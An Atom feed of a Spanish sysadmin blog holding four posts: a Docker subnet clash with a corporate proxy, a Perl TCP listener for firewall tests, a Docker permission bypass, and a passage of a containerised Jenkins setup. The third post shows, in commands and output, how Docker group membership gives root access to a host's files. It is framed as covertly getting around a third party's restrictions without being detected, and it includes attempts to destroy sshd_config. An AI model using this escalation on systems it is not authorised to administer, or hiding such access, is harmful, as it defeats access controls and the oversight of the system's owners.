<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Linux Sysadmin - Operaciones</title><link href="https://www.linuxsysadmin.ml/" rel="alternate"></link><link href="https://www.linuxsysadmin.ml/feeds/operaciones.atom.xml" rel="self"></link><id>https://www.linuxsysadmin.ml/</id><updated>2019-02-19T19:00:00+01:00</updated><entry><title>Forzar rangos de IPs prohibidas para Docker</title><link href="https://www.linuxsysadmin.ml/2019/02/forzar-rangos-de-ips-prohibidas-para-docker.html" rel="alternate"></link><published>2019-02-19T19:00:00+01:00</published><updated>2019-02-19T19:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2019-02-19:/2019/02/forzar-rangos-de-ips-prohibidas-para-docker.html</id><summary type="html">&lt;p&gt;Tras cambiar de oficina en mi trabajo, vuelvo a tener el dudoso honor de trabajar tras un &lt;em&gt;proxy&lt;/em&gt;. Como viene siendo habitual, me puse un servidor &lt;strong&gt;Virtualbox&lt;/strong&gt; con &lt;strong&gt;Debian&lt;/strong&gt; para disponer de las opciones que una máquina auxiliar me ofrece, pero no fue hasta instalar &lt;strong&gt;Docker&lt;/strong&gt; que estalló el desastre …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Tras cambiar de oficina en mi trabajo, vuelvo a tener el dudoso honor de trabajar tras un &lt;em&gt;proxy&lt;/em&gt;. Como viene siendo habitual, me puse un servidor &lt;strong&gt;Virtualbox&lt;/strong&gt; con &lt;strong&gt;Debian&lt;/strong&gt; para disponer de las opciones que una máquina auxiliar me ofrece, pero no fue hasta instalar &lt;strong&gt;Docker&lt;/strong&gt; que estalló el desastre.&lt;/p&gt;
&lt;p&gt;Y el caso es que tenía el servidor básico funcionando, bien configurado, con acceso a internet y sin problemas. Fuí a instalar &lt;strong&gt;Docker&lt;/strong&gt; y todo parecía correcto, con las configuraciones de &lt;em&gt;proxy&lt;/em&gt; adecuadas. De repente intento comprobar la red solicitando una página web cualquiera, y... ¡sorpresa!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ curl http://www.google.es/
curl: &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; Failed to connect to proxy.acme.biz port &lt;span class="m"&gt;3128&lt;/span&gt;: No existe ninguna ruta hasta el &lt;span class="sb"&gt;`&lt;/span&gt;host&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por supuesto, lo primero tras un error de este estilo es mirar la tabla de rutas, a ver que es lo que aplica para resolver esta ruta:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ ip route
default via &lt;span class="m"&gt;10&lt;/span&gt;.0.2.2 dev enp0s3
&lt;span class="m"&gt;10&lt;/span&gt;.0.2.0/24 dev enp0s3 proto kernel scope link src &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15
&lt;span class="m"&gt;169&lt;/span&gt;.254.0.0/16 dev enp0s3 scope link metric &lt;span class="m"&gt;1000&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.0/16 dev docker0 proto kernel scope link src &lt;span class="m"&gt;172&lt;/span&gt;.17.0.1 linkdown
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y es que la IP del &lt;em&gt;proxy&lt;/em&gt; es privada, estando en el rango 172.17.x.x; concretamente estaba en la 172.17.10.20. De esta forma, todas las peticiones al &lt;em&gt;proxy&lt;/em&gt; caen en la última ruta, y entran en el dominio de &lt;strong&gt;Docker&lt;/strong&gt;, que por supuesto, no tiene ningún contenedor con esa dirección IP.&lt;/p&gt;
&lt;p&gt;Visto esto solo queda instruir a &lt;strong&gt;Docker&lt;/strong&gt; para que no haga uso de ese rango. Parece difícil, pero no lo es; &lt;strong&gt;Docker&lt;/strong&gt; decide que el rango está ocupado o no mirando la tabla de rutas, con mejor o menor acierto.&lt;/p&gt;
&lt;p&gt;El truco es simple: consiste en hacer creer a &lt;strong&gt;Docker&lt;/strong&gt; que ese bloque está ocupado, añadiendo algo a la tabla de rutas. En principio, la regla caería en la zona &lt;strong&gt;default&lt;/strong&gt;, saldría por el dispositivo &lt;strong&gt;enp0s3&lt;/strong&gt; y utilizaría el &lt;em&gt;gateway&lt;/em&gt; &lt;strong&gt;10.0.2.2&lt;/strong&gt;. Hagamos un bloque con el rango 172.17.0.0/16 que haga exactamente eso.&lt;/p&gt;
&lt;p&gt;Lo primero es parar el servicio de &lt;strong&gt;Docker&lt;/strong&gt;, y eliminar su carpeta de datos en &lt;code&gt;/var/lib/docker&lt;/code&gt;. Esto nos permitirá trabajar sin &lt;strong&gt;Docker&lt;/strong&gt; recuerde nada en el inicio y que olvide cualquier red que ya haya podido crear.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: Esto va a eliminar configuraciones, imágenes, redes, volúmenes y contenedores; yo partía de un servidor vacío.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ sudo service docker stop
&lt;span class="o"&gt;[&lt;/span&gt;sudo&lt;span class="o"&gt;]&lt;/span&gt; password &lt;span class="k"&gt;for&lt;/span&gt; gerard:
gerard@shangrila:~$ sudo rm -R /var/lib/docker/
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tenemos que conseguir preconfigurar una ruta, que es relativamente simple y bien documentado; en mi caso concreto se trata de un servidor &lt;strong&gt;Debian&lt;/strong&gt; y la documentación me hizo añadir la ruta en &lt;code&gt;/etc/network/interfaces&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ cat /etc/network/interfaces
...
allow-hotplug enp0s3
iface enp0s3 inet dhcp
        post-up ip route add &lt;span class="m"&gt;172&lt;/span&gt;.17.0.0/16 dev enp0s3 via &lt;span class="m"&gt;10&lt;/span&gt;.0.2.2
...
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para descartar los cambios residuales y aplicar los nuevos, me limité a reiniciar el servidor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ sudo reboot
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras el reinicio, se puede ver que la ruta ha aplicado, y que &lt;strong&gt;Docker&lt;/strong&gt; ha tenido que configurarse en otro rango libre:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ ip route
default via &lt;span class="m"&gt;10&lt;/span&gt;.0.2.2 dev enp0s3
&lt;span class="m"&gt;10&lt;/span&gt;.0.2.0/24 dev enp0s3 proto kernel scope link src &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15
&lt;span class="m"&gt;169&lt;/span&gt;.254.0.0/16 dev enp0s3 scope link metric &lt;span class="m"&gt;1000&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.0/16 via &lt;span class="m"&gt;10&lt;/span&gt;.0.2.2 dev enp0s3
&lt;span class="m"&gt;172&lt;/span&gt;.18.0.0/16 dev docker0 proto kernel scope link src &lt;span class="m"&gt;172&lt;/span&gt;.18.0.1 linkdown
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ docker inspect bridge
&lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;Name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;bridge&amp;quot;&lt;/span&gt;,
...
        &lt;span class="s2"&gt;&amp;quot;IPAM&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;Driver&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;default&amp;quot;&lt;/span&gt;,
            &lt;span class="s2"&gt;&amp;quot;Options&amp;quot;&lt;/span&gt;: null,
            &lt;span class="s2"&gt;&amp;quot;Config&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
                &lt;span class="o"&gt;{&lt;/span&gt;
                    &lt;span class="s2"&gt;&amp;quot;Subnet&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.18.0.0/16&amp;quot;&lt;/span&gt;
                &lt;span class="o"&gt;}&lt;/span&gt;
            &lt;span class="o"&gt;]&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;,
...
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;]&lt;/span&gt;
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda comprobar que el problema inicial, que era la falta de acceso a internet, se ha solucionado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ curl -I http://www.google.es/
HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
...
X-Cache: MISS from proxy.acme.biz
X-Cache-Lookup: MISS from proxy.acme.biz:3128
Via: &lt;span class="m"&gt;1&lt;/span&gt;.1 proxy.acme.biz &lt;span class="o"&gt;(&lt;/span&gt;squid&lt;span class="o"&gt;)&lt;/span&gt;
Connection: keep-alive

gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto hemos acabado.&lt;/p&gt;</content><category term="docker"></category><category term="proxy"></category></entry><entry><title>Testeando la apertura de puertos con Perl</title><link href="https://www.linuxsysadmin.ml/2019/01/testeando-la-apertura-de-puertos-con-perl.html" rel="alternate"></link><published>2019-01-14T10:00:00+01:00</published><updated>2019-01-14T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2019-01-14:/2019/01/testeando-la-apertura-de-puertos-con-perl.html</id><summary type="html">&lt;p&gt;Muchas veces me toca solicitar la apertura de puertos en un &lt;em&gt;firewall&lt;/em&gt; que no administro. Muchas veces estos administradores se olvidan de ejecutar pasos que resultan en una ausencia total de conectividad, lo que me obliga a revisar su trabajo antes de poner alguna aplicación dando servicio en ese puerto …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Muchas veces me toca solicitar la apertura de puertos en un &lt;em&gt;firewall&lt;/em&gt; que no administro. Muchas veces estos administradores se olvidan de ejecutar pasos que resultan en una ausencia total de conectividad, lo que me obliga a revisar su trabajo antes de poner alguna aplicación dando servicio en ese puerto.&lt;/p&gt;
&lt;p&gt;La política de muchas redes es que el &lt;em&gt;firewall&lt;/em&gt; responda un &lt;em&gt;connection refused&lt;/em&gt; cuando bloquea las peticiones internas, con lo que no se puede ver si es que no hay aplicación, o es que el &lt;em&gt;firewall&lt;/em&gt; la ha bloqueado. Normalmente levantaría un servicio de "usar y tirar" para comprobar que se llega a ese puerto y que se obtiene una respuesta adecuada:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~/workspace$ python3 -m http.server &lt;span class="m"&gt;8080&lt;/span&gt;
Serving HTTP on &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0 port &lt;span class="m"&gt;8080&lt;/span&gt; ...
&lt;span class="m"&gt;10&lt;/span&gt;.0.2.2 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;09&lt;/span&gt;/Jan/2019 &lt;span class="m"&gt;12&lt;/span&gt;:33:26&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET / HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; -
&lt;span class="m"&gt;10&lt;/span&gt;.0.2.2 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;09&lt;/span&gt;/Jan/2019 &lt;span class="m"&gt;12&lt;/span&gt;:33:26&lt;span class="o"&gt;]&lt;/span&gt; code &lt;span class="m"&gt;404&lt;/span&gt;, message File not found
&lt;span class="m"&gt;10&lt;/span&gt;.0.2.2 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;09&lt;/span&gt;/Jan/2019 &lt;span class="m"&gt;12&lt;/span&gt;:33:26&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET /favicon.ico HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;404&lt;/span&gt; -
^C
Keyboard interrupt received, exiting.
gerard@shangrila:~/workspace$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sin embargo esta vez había algo diferente; se trataba de una máquina &lt;strong&gt;AIX&lt;/strong&gt; sin &lt;strong&gt;python&lt;/strong&gt; y gestionada por terceros, que no me iban a instalar &lt;strong&gt;python&lt;/strong&gt;, y mucho menos para esa tontería... &lt;/p&gt;
&lt;p&gt;Así que fuí mirando las herramientas de las que disponía: no había &lt;strong&gt;netstat&lt;/strong&gt;, ningún compilador de &lt;strong&gt;C&lt;/strong&gt;, nada de nada... excepto &lt;strong&gt;perl&lt;/strong&gt;. No soy nada fan de &lt;strong&gt;perl&lt;/strong&gt;, pero fue mi salvación. Por supuesto, no conozco casi nada el lenguaje, así que tuve que tirar de internet. Tras simplificar ejemplos de cientos de líneas llegué a un servidor mínimo capaz de aceptar peticiones TCP y loguear la IP origen, como concepto de que se llega. Me limito a dejarlo por aquí, para futuras referencias:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/perl&lt;/span&gt;

&lt;span class="k"&gt;use&lt;/span&gt; &lt;span class="nn"&gt;IO::Socket&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nv"&gt;$port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$ARGV&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="nv"&gt;$socket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nn"&gt;IO::Socket::&lt;/span&gt;&lt;span class="n"&gt;INET&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="n"&gt;LocalHost&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;0.0.0.0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="n"&gt;LocalPort&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$port&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="n"&gt;Proto&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;tcp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="n"&gt;Listen&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="n"&gt;Reuse&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nb"&gt;die&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Coudn&amp;#39;t open socket&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;unless&lt;/span&gt; &lt;span class="nv"&gt;$socket&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;TCP Server listening on port $port\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nv"&gt;$client_socket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$socket&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="nb"&gt;accept&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="nv"&gt;$peer_address&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$client_socket&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;peerhost&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;I got a connection from $peer_address\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En cuanto a la ejecución, nada del otro mundo: basta con invocar el &lt;em&gt;script&lt;/em&gt; con el puerto a abrir por parámetro. El ejemplo asume que el &lt;em&gt;script&lt;/em&gt; tiene permisos de ejecución; sino, os va tocar poner el intérprete delante.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~/workspace$ ./tcpserver.pl &lt;span class="m"&gt;8080&lt;/span&gt;
TCP Server listening on port &lt;span class="m"&gt;8080&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si llega alguna petición al "servidor" que tenemos montado, veremos que queda registrada su IP origen:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~/workspace$ ./tcpserver.pl &lt;span class="m"&gt;8080&lt;/span&gt;
TCP Server listening on port &lt;span class="m"&gt;8080&lt;/span&gt;
I got a connection from &lt;span class="m"&gt;10&lt;/span&gt;.0.2.2
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto podemos asegurar que nos llegan los paquetes de red. En este caso concreto, las peticiones se han hecho con un navegador normal, y como no devolvemos respuesta, nos da un mensaje del tipo &lt;code&gt;ERR_EMPTY_RESPONSE&lt;/code&gt;; esto es completamente normal.&lt;/p&gt;</content><category term="perl"></category><category term="script"></category><category term="tcp"></category></entry><entry><title>Usando Docker para saltarse los permisos de Linux</title><link href="https://www.linuxsysadmin.ml/2018/12/usando-docker-para-saltarse-los-permisos-de-linux.html" rel="alternate"></link><published>2018-12-17T10:00:00+01:00</published><updated>2018-12-17T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-12-17:/2018/12/usando-docker-para-saltarse-los-permisos-de-linux.html</id><summary type="html">&lt;p&gt;Según el paradigma de externalización de mi empresa, todos los sistemas son gestionados por un tercero, a base de cambios. Por petición mia, tengo un usuario nominal de SSH y puedo entrar a mirar logs y configuraciones, pero no todas. Lo que no saben es que puedo hacer de todo …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Según el paradigma de externalización de mi empresa, todos los sistemas son gestionados por un tercero, a base de cambios. Por petición mia, tengo un usuario nominal de SSH y puedo entrar a mirar logs y configuraciones, pero no todas. Lo que no saben es que puedo hacer de todo.&lt;/p&gt;
&lt;p&gt;El otro día intenté mirar una configuración de sistema (concretamente el &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;) para ver si había una configuración específica de enjaulado de los usuarios, puesto que se trata de un SFTP público.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:/etc/ssh$ cat sshd_config
cat: sshd_config: Permiso denegado
gerard@atlantis:/etc/ssh$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No se quien es el paranoico que pidió estos permisos, pero me toca pasar por el aro; o bien solicito que me lo pasen, o bien pido permisos de &lt;em&gt;sudo&lt;/em&gt; o similar. Pero hay una manera que no va a tardar días, y que los técnicos que lo llevan no han controlado: el servidor tiene &lt;strong&gt;docker&lt;/strong&gt; instalado, y mi usuario pertenece al grupo.&lt;/p&gt;
&lt;p&gt;Eso me permite ejecutar un contenedor con el &lt;em&gt;uid&lt;/em&gt; que yo quiera, siendo el &lt;em&gt;uid&lt;/em&gt; por defecto el "0" que es el usuario &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ docker run -ti --rm -u &lt;span class="m"&gt;70&lt;/span&gt; alpine:3.8
/ $ grep &lt;span class="m"&gt;70&lt;/span&gt; /etc/passwd
postgres:x:70:70::/var/lib/postgresql:/bin/sh
/ $ whoami
postgres
/ $ id
&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;70&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;postgres&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;70&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;postgres&lt;span class="o"&gt;)&lt;/span&gt;
/ $
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: La traducción entre el &lt;em&gt;uid&lt;/em&gt; "70" y el usuario "postgres" se hace en base al fichero &lt;code&gt;/etc/passwd&lt;/code&gt; &lt;strong&gt;del contenedor&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Solo nos queda montar el sistema de ficheros del servidor en una carpeta cualquiera como un volumen y así puedo ver y modificar lo que ya quiera.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ docker run -ti --rm -v /:/host alpine:3.8
/ &lt;span class="c1"&gt;# whoami&lt;/span&gt;
root
/ &lt;span class="c1"&gt;# cat /host/etc/ssh/sshd_config&lt;/span&gt;
&lt;span class="c1"&gt;#       $OpenBSD: sshd_config,v 1.100 2016/08/15 12:32:04 naddy Exp $&lt;/span&gt;

&lt;span class="c1"&gt;# This is the sshd server system-wide configuration file.  See&lt;/span&gt;
&lt;span class="c1"&gt;# sshd_config(5) for more information.&lt;/span&gt;
...
/ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si solo pretendéis ver, montad el volúmen con la opción &lt;em&gt;readonly&lt;/em&gt;, y os váis a evitar elgún error que os pueda delatar. Sin embargo, si váis a hacer modificaciones meditadas y conscientes, adelante.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ docker run -ti --rm -v /:/host:ro alpine:3.8
/ &lt;span class="c1"&gt;# whoami&lt;/span&gt;
root
/ &lt;span class="c1"&gt;# rm /host/etc/ssh/sshd_config&lt;/span&gt;
rm: remove &lt;span class="s1"&gt;&amp;#39;/host/etc/ssh/sshd_config&amp;#39;&lt;/span&gt;? y
rm: can&lt;span class="s1"&gt;&amp;#39;t remove &amp;#39;&lt;/span&gt;/host/etc/ssh/sshd_config&lt;span class="s1"&gt;&amp;#39;: Read-only file system&lt;/span&gt;
&lt;span class="s1"&gt;/ # echo &amp;#39;&lt;/span&gt;destroyed&lt;span class="s1"&gt;&amp;#39; &amp;gt; /host/etc/ssh/sshd_config&lt;/span&gt;
&lt;span class="s1"&gt;/bin/sh: can&amp;#39;&lt;/span&gt;t create /host/etc/ssh/sshd_config: Read-only file system
/ &lt;span class="c1"&gt;# truncate -s 0 /host/etc/ssh/sshd_config&lt;/span&gt;
truncate: /host/etc/ssh/sshd_config: open: Read-only file system
/ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Recordad que lo que hagáis a partir de aquí queda bajo vuestra propia responsabilidad... Sed cautos&lt;/p&gt;</content><category term="docker"></category><category term="permisos"></category><category term="linux"></category></entry><entry><title>Un entorno de jenkins distribuido en contenedores</title><link href="https://www.linuxsysadmin.ml/2018/11/un-entorno-de-jenkins-distribuido-en-contenedores.html" rel="alternate"></link><published>2018-11-12T10:00:00+01:00</published><updated>2018-11-12T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-11-12:/2018/11/un-entorno-de-jenkins-distribuido-en-contenedores.html</id><summary type="html">&lt;p&gt;Estaba yo el otro día intentando montar un &lt;strong&gt;jenkins&lt;/strong&gt; con acceso al binario de &lt;strong&gt;docker&lt;/strong&gt; y &lt;strong&gt;python&lt;/strong&gt;. Como no quería instalar &lt;strong&gt;jenkins&lt;/strong&gt;, me limité a extender la imagen &lt;a href="https://hub.docker.com/r/jenkins/jenkins/"&gt;jenkins/jenkins&lt;/a&gt; para dotarlo de las herramientas necesarias, como &lt;a href="https://www.linuxsysadmin.ml/2016/09/lanzando-playbooks-de-ansible-desde-jenkins.html"&gt;ya hicimos con ansible&lt;/a&gt; que, aunque funciona, no es ni elegante ni escalable …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Estaba yo el otro día intentando montar un &lt;strong&gt;jenkins&lt;/strong&gt; con acceso al binario de &lt;strong&gt;docker&lt;/strong&gt; y &lt;strong&gt;python&lt;/strong&gt;. Como no quería instalar &lt;strong&gt;jenkins&lt;/strong&gt;, me limité a extender la imagen &lt;a href="https://hub.docker.com/r/jenkins/jenkins/"&gt;jenkins/jenkins&lt;/a&gt; para dotarlo de las herramientas necesarias, como &lt;a href="https://www.linuxsysadmin.ml/2016/09/lanzando-playbooks-de-ansible-desde-jenkins.html"&gt;ya hicimos con ansible&lt;/a&gt; que, aunque funciona, no es ni elegante ni escalable.&lt;/p&gt;
&lt;p&gt;El resultado es una imagen que hace demasiadas cosas, no es modular y un cambio requiere la recreación de la herramienta completa. Así que se me ocurrió otra forma de hacer las cosas, teniendo en cuenta que la herramienta funciona en modo &lt;em&gt;master/slave&lt;/em&gt;. Básicamente se trata de dejar al &lt;strong&gt;jenkins&lt;/strong&gt; como &lt;em&gt;master&lt;/em&gt; y delegar los &lt;em&gt;jobs&lt;/em&gt; a otros contenedores con las herramientas necesarias.&lt;/p&gt;
&lt;p&gt;Para estos &lt;em&gt;workers&lt;/em&gt; solo necesitamos un contenedor con &lt;strong&gt;SSH&lt;/strong&gt; y &lt;strong&gt;Java&lt;/strong&gt;. El resto de herramientas serían las necesarias para lanzar los comandos que conforman nuestro &lt;em&gt;job&lt;/em&gt;. Veamos un ejemplo.&lt;/p&gt;
&lt;h2&gt;El master: Jenkins&lt;/h2&gt;
&lt;p&gt;Lo primero que necesitamos es que el &lt;strong&gt;jenkins&lt;/strong&gt; y sus &lt;em&gt;slaves&lt;/em&gt; estén en la misma red; el &lt;em&gt;master&lt;/em&gt; va a empujar los comandos a los &lt;em&gt;slaves&lt;/em&gt; mediante &lt;strong&gt;SSH&lt;/strong&gt;. Crearemos una red tipo "bridge" de usuario, que nos garantiza que los contenedores resuelvan DNS por su nombre.&lt;/p&gt;
&lt;p&gt;Normalmente dejaría que lo hiciera &lt;strong&gt;docker-compose&lt;/strong&gt;, pero pretendo separar el entorno en varios &lt;em&gt;docker-compose.yml&lt;/em&gt; para poder actualizar los &lt;em&gt;workers&lt;/em&gt; según su tipo. En caso de utilizar &lt;strong&gt;docker swarm&lt;/strong&gt;, podríamos usar una red &lt;em&gt;overlay&lt;/em&gt; para que sea irrelevante en las comunicaciones el nodo de &lt;em&gt;swarm&lt;/em&gt; en el que estén desplegados.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ docker network create jenkins
898c8a3b77761ac4a886d0a7a2546bfc475fc3ae1280cf1ddc37a55b2057c084
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sobre esta red solamente necesitamos levantar el &lt;strong&gt;jenkins&lt;/strong&gt; usando la imagen &lt;code&gt;jenkins/jenkins&lt;/code&gt;, en la versión y sistema operativo deseado. Solamente vamos a usar un volúmen para mantener las configuraciones de forma persistente, y vamos a publicar el puerto de &lt;strong&gt;jenkins&lt;/strong&gt; para su uso por parte de otras máquinas de nuestra red.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/jenkins$ cat docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
services:
  jenkins:
    image: jenkins/jenkins:alpine
    container_name: jenkins
    hostname: jenkins
    volumes:
      - jenkins_home:/var/jenkins_home
    networks:
      jenkins: &lt;span class="o"&gt;{}&lt;/span&gt;
    ports:
      - &lt;span class="s2"&gt;&amp;quot;8080:8080&amp;quot;&lt;/span&gt;
volumes:
  jenkins_home:
networks:
  jenkins:
